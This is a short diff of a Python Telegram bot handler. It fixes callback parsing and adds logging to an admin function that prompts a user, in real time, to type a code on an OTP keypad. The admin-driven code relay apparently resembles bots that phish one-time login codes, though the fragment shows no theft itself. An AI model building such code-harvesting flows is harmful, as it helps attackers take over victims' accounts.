@@ -489,23 +489,32 @@ async def custom_autodelete_handler(update: Update, context: ContextTypes.DEFAUL
 
 async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handles admin sending SMS/Code prompt to user."""
-    query = update.callback_query
-    await query.answer()
-    
-    parts = query.data.split("_")
-    user_id = int(parts[2])
-    
-    if "done" in query.data:
-        # Tell user to enter code
-        await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
-        await asyncio.sleep(2)
-        await context.bot.send_message(
-            chat_id=user_id, 
-            text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", 
-            reply_markup=get_otp_keyboard(),
-            parse_mode='Markdown'
-        )
-        await query.message.edit_text("✅ Code request sent to user.")
-    else:
-        # Just an example of interaction
-        await query.answer(f"Digit {parts[3]} selected")
+    try:
+        query = update.callback_query
+        data = query.data
+        logging.info(f"Admin SMS callback received: {data}")
+        
+        parts = data.split("_")
+        # admin_sms_done_USERID or admin_sms_USERID_DIGIT
+        if "done" in data:
+            user_id = int(parts[3])
+            await query.answer("Sending code request to user... ✅")
+            
+            # Tell user to enter code
+            await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
+            await asyncio.sleep(1)
+            await context.bot.send_message(
+                chat_id=user_id, 
+                text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", 
+                reply_markup=get_otp_keyboard(),
+                parse_mode='Markdown'
+            )
+            await query.message.edit_text(f"✅ Code request sent to user (ID: {user_id}).")
+        else:
+            user_id = int(parts[2])
+            digit = parts[3]
+            await query.answer(f"Digit {digit} selected")
+            # You can add logic here to show selected digits to admin if needed
+    except Exception as e:
+        logging.error(f"Error in admin_sms_handler: {e}")
+        await query.answer("Error processing request! ❌", show_alert=True)
